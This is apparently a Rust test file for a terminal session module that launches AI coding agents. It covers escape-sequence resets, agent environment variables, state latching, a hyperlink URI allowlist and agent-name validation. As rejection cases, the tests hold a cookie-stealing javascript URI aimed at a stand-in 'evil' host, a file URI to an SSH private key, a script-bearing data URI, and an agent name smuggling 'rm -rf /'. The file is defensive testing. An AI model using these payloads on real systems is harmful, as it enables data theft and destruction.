//! Tests for `session`.
use super::*;

#[test]
fn focus_swap_reset_covers_every_mode_current_mode_state_may_emit() {
    // Symmetry contract: every mode that `current_mode_state` can
    // set on the outer terminal during focus-in must have a
    // matching off-toggle in `focus_swap_reset`, otherwise the
    // previous pane's mode silently leaks into the new pane.
    //
    // `current_mode_state` can emit:
    //   - `\x1b[?2004h` (bracketed paste)   → reset `?2004l`
    //   - `\x1b[?1h`    (application cursor) → reset `?1l`
    //   - `\x1b[>{n}u`  (kitty kb push)     → reset `\x1b[<u` (pop)
    //   - `\x1b[?25h/l` (cursor visibility) → intentionally NOT in
    //                                         reset; `current_mode_state`
    //                                         unconditionally re-asserts.
    let reset = Session::focus_swap_reset();
    for needle in [&b"\x1b[?2004l"[..], &b"\x1b[?1l"[..], &b"\x1b[<u"[..]] {
        assert!(
            reset.windows(needle.len()).any(|w| w == needle),
            "focus_swap_reset missing {needle:?}; got {reset:?}"
        );
    }
}

#[test]
fn focus_swap_reset_leaves_client_owned_modes_alone() {
    // The attach client owns mouse reporting, focus reporting,
    // alt-screen, and alternate-scroll suppression. The reset must
    // not touch them; clobbering them here drops the multiplexer's
    // ability to receive tab clicks, drag-resize, FocusIn/FocusOut,
    // or wheel mouse events for the remainder of the session.
    let reset = Session::focus_swap_reset();
    for forbidden in [
        &b"\x1b[?1000l"[..],
        &b"\x1b[?1002l"[..],
        &b"\x1b[?1003l"[..],
        &b"\x1b[?1006l"[..],
        &b"\x1b[?1007l"[..],
        &b"\x1b[?1004l"[..],
        &b"\x1b[?1049l"[..],
        &b"\x1b[?25l"[..],
        &b"\x1b[?25h"[..],
    ] {
        assert!(
            !reset.windows(forbidden.len()).any(|w| w == forbidden),
            "focus_swap_reset must not toggle {forbidden:?}"
        );
    }
}

#[test]
fn build_agent_command_overrides_stale_agent_env() {
    let env = vec![("JACKIN_AGENT".to_string(), "claude".to_string())];
    let cmd = build_agent_command("codex", None, &env, Path::new("/workspace"));

    assert_eq!(
        cmd.get_env("JACKIN_AGENT").and_then(|value| value.to_str()),
        Some("codex")
    );
}

#[test]
fn build_agent_command_uses_stable_pane_term() {
    let env = vec![("TERM".to_string(), "xterm-ghostty".to_string())];
    let cmd = build_agent_command("codex", None, &env, Path::new("/workspace"));

    assert_eq!(
        cmd.get_env("TERM").and_then(|value| value.to_str()),
        Some("xterm-256color")
    );
}

#[test]
fn build_agent_command_advertises_truecolor() {
    let env = vec![("COLORTERM".to_string(), "24bit".to_string())];
    let cmd = build_agent_command("claude", None, &env, Path::new("/workspace"));

    assert_eq!(
        cmd.get_env("COLORTERM").and_then(|value| value.to_str()),
        Some("truecolor")
    );
}

#[test]
fn build_shell_command_advertises_truecolor() {
    let env = vec![("COLORTERM".to_string(), "false".to_string())];
    let cmd = build_shell_command(&env, Path::new("/workspace"));

    assert_eq!(
        cmd.get_env("COLORTERM").and_then(|value| value.to_str()),
        Some("truecolor")
    );
}

#[test]
fn agent_model_args_match_cli_contracts() {
    assert_eq!(
        agent_model_args("claude", Some("sonnet")),
        vec!["--model", "sonnet"]
    );
    assert_eq!(
        agent_model_args("codex", Some("gpt-5")),
        vec!["-m", "gpt-5"]
    );
    assert_eq!(
        agent_model_args("kimi", Some("kimi-k2")),
        vec!["--model", "kimi-k2"]
    );
    assert_eq!(
        agent_model_args("opencode", Some("zai/glm")),
        vec!["-m", "zai/glm"]
    );
    assert!(agent_model_args("amp", None).is_empty());
    assert!(agent_model_args("amp", Some("ignored")).is_empty());
}

#[test]
fn build_shell_command_removes_stale_agent_env() {
    let env = vec![("JACKIN_AGENT".to_string(), "claude".to_string())];
    let cmd = build_shell_command(&env, Path::new("/workspace"));

    assert!(cmd.get_env("JACKIN_AGENT").is_none());
}

#[test]
fn pty_output_does_not_clear_latched_blocked_state() {
    assert_eq!(
        state_after_pty_output(AgentState::Blocked),
        AgentState::Blocked
    );
    assert_eq!(
        state_after_pty_output(AgentState::Working),
        AgentState::Working
    );
    assert_eq!(
        state_after_pty_output(AgentState::Idle),
        AgentState::Working
    );
}

#[test]
fn refresh_latches_blocked_until_operator_input() {
    assert_eq!(
        state_after_refresh(AgentState::Working, BLOCKED_AFTER),
        AgentState::Blocked
    );
    assert_eq!(
        state_after_refresh(AgentState::Blocked, std::time::Duration::ZERO),
        AgentState::Blocked
    );
    assert_eq!(
        state_after_refresh(AgentState::Idle, BLOCKED_AFTER / 2),
        AgentState::Working
    );
}

#[test]
fn osc8_uri_empty_is_safe() {
    // Empty URI = link terminator; must always pass.
    assert!(osc8_uri_is_safe(b""));
}

#[test]
fn osc8_uri_http_https_mailto_pass() {
    assert!(osc8_uri_is_safe(b"http://example.com"));
    assert!(osc8_uri_is_safe(b"https://example.com"));
    assert!(osc8_uri_is_safe(b"HTTPS://EXAMPLE.COM"));
    assert!(osc8_uri_is_safe(b"mailto:foo@example.com"));
}

#[test]
fn osc8_uri_unsafe_schemes_rejected() {
    // The threat scenarios the allowlist is here to block.
    assert!(!osc8_uri_is_safe(
        b"javascript:fetch('//evil/?'+document.cookie)"
    ));
    assert!(!osc8_uri_is_safe(b"file:///Users/operator/.ssh/id_rsa"));
    assert!(!osc8_uri_is_safe(
        b"data:text/html,<script>alert(1)</script>"
    ));
    assert!(!osc8_uri_is_safe(b"ssh://server"));
}

#[test]
fn osc8_uri_non_utf8_rejected() {
    // A URI that isn't valid UTF-8 cannot pass the lowercase
    // scheme check. Defensive — terminal emulators would reject
    // it too — but the allowlist must not accidentally permit
    // it via the from_utf8 short-circuit.
    assert!(!osc8_uri_is_safe(&[0xFF, 0xFE]));
}

#[test]
fn validate_agent_slug_rejects_typical_attacks() {
    let supported = Vec::new();
    assert!(validate_agent_slug("", &supported).is_err());
    assert!(validate_agent_slug("--debug", &supported).is_err());
    assert!(validate_agent_slug("claude\n; rm -rf /", &supported).is_err());
    assert!(validate_agent_slug("claude codex", &supported).is_err());
    assert!(validate_agent_slug("claude\0", &supported).is_err());
}

#[test]
fn validate_agent_slug_accepts_well_formed_slug_when_no_allowlist() {
    let supported = Vec::new();
    assert!(validate_agent_slug("claude", &supported).is_ok());
    assert!(validate_agent_slug("codex", &supported).is_ok());
}

#[test]
fn validate_agent_slug_rejects_slug_outside_launch_config_allowlist() {
    let supported = vec!["claude".to_string()];
    assert!(validate_agent_slug("claude", &supported).is_ok());
    assert_eq!(
        validate_agent_slug("codex", &supported).unwrap_err(),
        "not in launch config allowlist"
    );
}
